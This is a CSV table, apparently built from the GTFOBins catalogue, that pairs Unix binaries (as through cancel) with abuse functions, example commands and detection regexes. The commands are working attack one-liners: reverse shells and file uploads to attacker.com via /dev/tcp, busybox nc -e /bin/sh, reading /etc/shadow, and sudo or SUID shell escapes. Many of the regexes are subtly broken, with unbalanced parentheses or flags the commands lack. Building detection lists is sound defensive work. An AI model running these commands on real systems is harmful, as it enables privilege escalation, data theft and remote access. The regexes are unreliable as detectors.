Name,Function,ExampleCode,Regex
as,suid,./as @$LFILE,(?i)(?:sudo\s+)?(?:\S*/)?as\s+.*)
as,sudo,sudo as @$LFILE,(?i)(?:sudo\s+)?(?:\S*/)?as\s+.*)
ascii-xfr,file-read,"ascii-xfr -ns ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?ascii\-xfr\s+.*)
ascii-xfr,suid,"./ascii-xfr -ns ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?ascii\-xfr\s+.*)
ascii-xfr,sudo,"sudo ascii-xfr -ns ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?ascii\-xfr\s+.*)
ascii85,file-read,"ascii85 ""$LFILE"" | ascii85 --decode",(?i)(?:sudo\s+)?(?:\S*/)?ascii85\s+.*)
ascii85,sudo,"sudo ascii85 ""$LFILE"" | ascii85 --decode",(?i)(?:sudo\s+)?(?:\S*/)?ascii85\s+.*)
ash,shell,ash,(?i)(?:sudo\s+)?(?:\S*/)?ash\s+.*)
ash,file-write,"export LFILE=file_to_write
ash -c 'echo DATA > $LFILE'",(?i)(?:sudo\s+)?(?:\S*/)?ash\s*\-c\s+.*)
ash,suid,./ash,(?i)(?:sudo\s+)?(?:\S*/)?ash\s+.*)
ash,sudo,sudo ash,(?i)(?:sudo\s+)?(?:\S*/)?ash\s+.*)
aspell,file-read,"aspell -c ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?aspell\s*\-c\s+.*)
aspell,suid,"./aspell -c ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?aspell\s*\-c\s+.*)
aspell,sudo,"sudo aspell -c ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?aspell\s*\-c\s+.*)
at,shell,"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null",(?i)(?:sudo\s+)?(?:\S*/)?at\s*\-f\s+.*/bin/sh)
at,command,"echo ""$COMMAND"" | at now",(?i)(?:sudo\s+)?(?:\S*/)?at\s+.*)
at,sudo,"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | sudo at now; tail -f /dev/null",(?i)(?:sudo\s+)?(?:\S*/)?at\s*\-f\s+.*/bin/sh)
atobm,file-read,"atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'",(?i)(?:sudo\s+)?(?:\S*/)?atobm\s*\-F\s+.*)
atobm,sudo,"sudo atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'",(?i)(?:sudo\s+)?(?:\S*/)?atobm\s*\-F\s+.*)
atobm,suid,"./atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'",(?i)(?:sudo\s+)?(?:\S*/)?atobm\s*\-F\s+.*)
awk,shell,"awk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:sudo\s+)?(?:\S*/)?awk\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh.*BEGIN)"
awk,non-interactive-reverse-shell,"awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'",(?i)(?:sudo\s+)?(?:\S*/)?awk\s*\-v\s*\-v\s+.*BEGIN.*/inet/tcp)
awk,non-interactive-bind-shell,"awk -v LPORT=$LPORT 'BEGIN {
s = ""/inet/tcp/"" LPORT ""/0/0"";
while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'",(?i)(?:sudo\s+)?(?:\S*/)?awk\s*\-v\s+.*BEGIN.*/inet/tcp)
awk,file-write,"awk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'",(?i)(?:sudo\s+)?(?:\S*/)?awk\s*\-v\s+.*BEGIN)
awk,file-read,"awk '//' ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?awk\s+.*)
awk,suid,"./awk '//' ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?awk\s+.*)
awk,sudo,"sudo awk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:sudo\s+)?(?:\S*/)?awk\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh.*BEGIN)"
awk,limited-suid,"./awk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:sudo\s+)?(?:\S*/)?awk\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh.*BEGIN)"
aws,shell,"aws help
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?aws\s+.*/bin/sh)
aws,sudo,"sudo aws help
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?aws\s+.*/bin/sh)
base32,file-read,"base32 ""$LFILE"" | base32 --decode",(?i)(?:sudo\s+)?(?:\S*/)?base32\s+.*)
base32,suid,"base32 ""$LFILE"" | base32 --decode",(?i)(?:sudo\s+)?(?:\S*/)?base32\s+.*)
base32,sudo,"sudo base32 ""$LFILE"" | base32 --decode",(?i)(?:sudo\s+)?(?:\S*/)?base32\s+.*)
base58,file-read,"base58 ""$LFILE"" | base58 --decode",(?i)(?:sudo\s+)?(?:\S*/)?base58\s+.*)
base58,sudo,"sudo base58 ""$LFILE"" | base58 --decode",(?i)(?:sudo\s+)?(?:\S*/)?base58\s+.*)
base64,file-read,"base64 ""$LFILE"" | base64 --decode",(?i)(?:sudo\s+)?(?:\S*/)?base64\s+.*)
base64,suid,"./base64 ""$LFILE"" | base64 --decode",(?i)(?:sudo\s+)?(?:\S*/)?base64\s+.*)
base64,sudo,"sudo base64 ""$LFILE"" | base64 --decode",(?i)(?:sudo\s+)?(?:\S*/)?base64\s+.*)
basenc,file-read,basenc --base64 $LFILE | basenc -d --base64,(?i)(?:sudo\s+)?(?:\S*/)?basenc\s*\-d\s+.*)
basenc,suid,basenc --base64 $LFILE | basenc -d --base64,(?i)(?:sudo\s+)?(?:\S*/)?basenc\s*\-d\s+.*)
basenc,sudo,sudo basenc --base64 $LFILE | basenc -d --base64,(?i)(?:sudo\s+)?(?:\S*/)?basenc\s*\-d\s+.*)
basez,file-read,"basez ""$LFILE"" | basez --decode",(?i)(?:sudo\s+)?(?:\S*/)?basez\s+.*)
basez,suid,"./basez ""$LFILE"" | basez --decode",(?i)(?:sudo\s+)?(?:\S*/)?basez\s+.*)
basez,sudo,"sudo basez ""$LFILE"" | basez --decode",(?i)(?:sudo\s+)?(?:\S*/)?basez\s+.*)
bash,shell,bash,(?i)(?:sudo\s+)?(?:\S*/)?bash\s+.*)
bash,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s*\-c\s*\-i\s+.*)
bash,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
bash -c 'echo -e ""POST / HTTP/0.9\n\n$(<$LFILE)"" > /dev/tcp/$RHOST/$RPORT'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s*\-c\s*\-e\s+.*)
bash,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s*\-c\s+.*)
bash,file-download,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
bash -c '{ echo -ne ""GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n"" 1>&3; cat 0<&3; } \
3<>/dev/tcp/$RHOST/$RPORT \
| { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } > $LFILE'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s*\-c\s*\-r\s+.*)
bash,file-download,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s*\-c\s+.*)
bash,file-write,"export LFILE=file_to_write
bash -c 'echo DATA > $LFILE'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s*\-c\s+.*)
bash,file-write,"history -c
DATA
history -w $LFILE",(?i)(?:sudo\s+)?(?:\S*/)?bash\s*\-c\s*\-w\s+.*)
bash,file-read,"export LFILE=file_to_read
bash -c 'echo ""$(<$LFILE)""'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s*\-c\s+.*)
bash,file-read,"history -r $LFILE
history",(?i)(?:sudo\s+)?(?:\S*/)?bash\s*\-r\s+.*)
bash,library-load,bash -c 'enable -f ./lib.so x',(?i)(?:sudo\s+)?(?:\S*/)?bash\s*\-c\s*\-f\s+.*)
bash,suid,./bash -p,(?i)(?:sudo\s+)?(?:\S*/)?bash\s*\-p\s+.*)
bash,sudo,sudo bash,(?i)(?:sudo\s+)?(?:\S*/)?bash\s+.*)
batcat,shell,"batcat --paging always /etc/profile
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?batcat\s+.*/bin/sh)
batcat,limited-suid,"./batcat --paging always /etc/profile
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?batcat\s+.*/bin/sh)
batcat,sudo,"sudo batcat --paging always /etc/profile
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?batcat\s+.*/bin/sh)
bc,file-read,"bc -s $LFILE
quit",(?i)(?:sudo\s+)?(?:\S*/)?bc\s*\-s\s+.*)
bc,sudo,"sudo bc -s $LFILE
quit",(?i)(?:sudo\s+)?(?:\S*/)?bc\s*\-s\s+.*)
bc,suid,"./bc -s $LFILE
quit",(?i)(?:sudo\s+)?(?:\S*/)?bc\s*\-s\s+.*)
bconsole,shell,"bconsole
@exec /bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?bconsole\s+.*/bin/sh)
bconsole,sudo,"sudo bconsole
@exec /bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?bconsole\s+.*/bin/sh)
bconsole,file-read,bconsole -c /etc/shadow,(?i)(?:sudo\s+)?(?:\S*/)?bconsole\s*\-c\s+.*)
bpftrace,sudo,"sudo bpftrace -e 'BEGIN {system(""/bin/sh"");exit()}'","(?i)(?:sudo\s+)?(?:\S*/)?bpftrace\s*\-e\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh.*BEGIN)"
bpftrace,sudo,"echo 'BEGIN {system(""/bin/sh"");exit()}' >$TF
sudo bpftrace $TF","(?i)(?:sudo\s+)?(?:\S*/)?bpftrace\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh.*BEGIN)"
bpftrace,sudo,sudo bpftrace -c /bin/sh -e 'END {exit()}',(?i)(?:sudo\s+)?(?:\S*/)?bpftrace\s*\-c\s*\-e\s+.*/bin/sh)
bridge,file-read,"bridge -b ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?bridge\s*\-b\s+.*)
bridge,suid,"./bridge -b ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?bridge\s*\-b\s+.*)
bridge,sudo,"sudo bridge -b ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?bridge\s*\-b\s+.*)
bundle,shell,"bundle help
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?bundle\s+.*/bin/sh)
bundle,shell,"export BUNDLE_GEMFILE=x
bundle exec /bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?bundle\s+.*/bin/sh)
bundle,shell,"touch $TF/Gemfile
cd $TF
bundle exec /bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?bundle\s+.*/bin/sh)
bundle,shell,"touch $TF/Gemfile
cd $TF
bundle console
system('/bin/sh -c /bin/sh')","(?i)(?:sudo\s+)?(?:\S*/)?bundle\s*\-c\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
bundle,shell,"echo 'system(""/bin/sh"")' > $TF/Gemfile
cd $TF
bundle install","(?i)(?:sudo\s+)?(?:\S*/)?bundle\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
bundle,sudo,"sudo bundle help
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?bundle\s+.*/bin/sh)
bundler,shell,"bundler help
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?bundler\s+.*/bin/sh)
bundler,shell,"export BUNDLE_GEMFILE=x
bundler exec /bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?bundler\s+.*/bin/sh)
bundler,shell,"touch $TF/Gemfile
cd $TF
bundler exec /bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?bundler\s+.*/bin/sh)
bundler,shell,"touch $TF/Gemfile
cd $TF
bundler console
system('/bin/sh -c /bin/sh')","(?i)(?:sudo\s+)?(?:\S*/)?bundler\s*\-c\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
bundler,shell,"echo 'system(""/bin/sh"")' > $TF/Gemfile
cd $TF
bundler install","(?i)(?:sudo\s+)?(?:\S*/)?bundler\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
bundler,sudo,"sudo bundler help
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?bundler\s+.*/bin/sh)
busctl,shell,"busctl --show-machine
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?busctl\s+.*/bin/sh)
busctl,shell,"busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",(?i)(?:sudo\s+)?(?:\S*/)?busctl\s*\-i\s+.*/bin/sh)
busctl,sudo,"sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",(?i)(?:sudo\s+)?(?:\S*/)?busctl\s*\-i\s+.*/bin/sh)
busctl,suid,"./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'",(?i)(?:sudo\s+)?(?:\S*/)?busctl\s*\-p\s*\-i\s+.*/bin/sh)
busybox,shell,busybox sh,(?i)(?:sudo\s+)?(?:\S*/)?busybox\s+.*)
busybox,file-upload,busybox httpd -f -p $LPORT -h .,(?i)(?:sudo\s+)?(?:\S*/)?busybox\s*\-f\s*\-p\s*\-h\s+.*)
busybox,file-write,"busybox sh -c 'echo ""DATA"" > $LFILE'",(?i)(?:sudo\s+)?(?:\S*/)?busybox\s*\-c\s+.*)
busybox,file-read,"./busybox cat ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?busybox\s+.*)
busybox,suid,./busybox sh,(?i)(?:sudo\s+)?(?:\S*/)?busybox\s+.*)
busybox,sudo,sudo busybox sh,(?i)(?:sudo\s+)?(?:\S*/)?busybox\s+.*)
busybox,reverse-shell,busybox nc -e /bin/sh $RHOST $RPORT,(?i)(?:sudo\s+)?(?:\S*/)?busybox\s*\-e\s+.*/bin/sh)
byebug,shell,"echo 'system(""/bin/sh"")' > $TF
byebug $TF
continue","(?i)(?:sudo\s+)?(?:\S*/)?byebug\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
byebug,limited-suid,"echo 'system(""/bin/sh"")' > $TF
./byebug $TF
continue","(?i)(?:sudo\s+)?(?:\S*/)?byebug\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
byebug,sudo,"echo 'system(""/bin/sh"")' > $TF
sudo byebug $TF
continue","(?i)(?:sudo\s+)?(?:\S*/)?byebug\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
bzip2,file-read,bzip2 -c $LFILE | bzip2 -d,(?i)(?:sudo\s+)?(?:\S*/)?bzip2\s*\-c\s*\-d\s+.*)
bzip2,suid,./bzip2 -c $LFILE | bzip2 -d,(?i)(?:sudo\s+)?(?:\S*/)?bzip2\s*\-c\s*\-d\s+.*)
bzip2,sudo,sudo bzip2 -c $LFILE | bzip2 -d,(?i)(?:sudo\s+)?(?:\S*/)?bzip2\s*\-c\s*\-d\s+.*)
c89,file-read,"c89 -x c -E ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?c89\s*\-x\s*\-E\s+.*)
c89,file-write,c89 -xc /dev/null -o $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?c89\s*\-o\s+.*)
c89,shell,"c89 -wrapper /bin/sh,-s .",(?i)(?:sudo\s+)?(?:\S*/)?c89\s+.*/bin/sh)
c89,sudo,"sudo c89 -wrapper /bin/sh,-s .",(?i)(?:sudo\s+)?(?:\S*/)?c89\s+.*/bin/sh)
c99,file-read,"c99 -x c -E ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?c99\s*\-x\s*\-E\s+.*)
c99,file-write,c99 -xc /dev/null -o $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?c99\s*\-o\s+.*)
c99,shell,"c99 -wrapper /bin/sh,-s .",(?i)(?:sudo\s+)?(?:\S*/)?c99\s+.*/bin/sh)
c99,sudo,"sudo c99 -wrapper /bin/sh,-s .",(?i)(?:sudo\s+)?(?:\S*/)?c99\s+.*/bin/sh)
cabal,shell,cabal exec -- /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?cabal\s+.*/bin/sh)
cabal,suid,./cabal exec -- /bin/sh -p,(?i)(?:sudo\s+)?(?:\S*/)?cabal\s*\-p\s+.*/bin/sh)
cabal,sudo,sudo cabal exec -- /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?cabal\s+.*/bin/sh)
cancel,file-upload,"cancel -u ""$(cat $LFILE)"" -h $RHOST:$RPORT",(?i)(?:sudo\s+)?(?:\S*/)?cancel\s*\-u\s*\-h\s+.*)
